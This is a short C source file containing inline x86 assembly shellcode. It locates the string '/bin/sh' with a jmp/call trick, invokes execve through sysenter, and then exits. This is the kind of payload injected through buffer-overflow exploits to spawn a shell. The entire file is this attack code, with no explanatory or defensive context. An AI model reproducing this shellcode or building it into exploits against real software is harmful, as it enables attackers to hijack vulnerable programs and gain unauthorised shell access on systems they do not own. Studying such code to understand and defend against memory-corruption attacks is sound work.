/* shellcodeasm.c */
void main(void) {
__asm__(       "                                \t\n\
                jmp    _call2                   \t\n\
                _start:                         \t\n\
                popl   %esi                     \t\n\
                movl   %esi,0x8(%esi)           \t\n\
                movb   $0x0,0x7(%esi)           \t\n\
                movl   $0x0,0xc(%esi)           \t\n\
                movl   $0xb,%eax                \t\n\
                movl   %esi,%ebx                \t\n\
                leal   0x8(%esi),%ecx           \t\n\
                leal   0xc(%esi),%edx           \t\n\
                sysenter                        \t\n\
                movl   $0x1, %eax               \t\n\
                movl   $0x0, %ebx               \t\n\
                sysenter                        \t\n\
                _call2:                         \t\n\
                call _start                     \t\n\
                .string \"/bin/sh\"             \t\n");
}
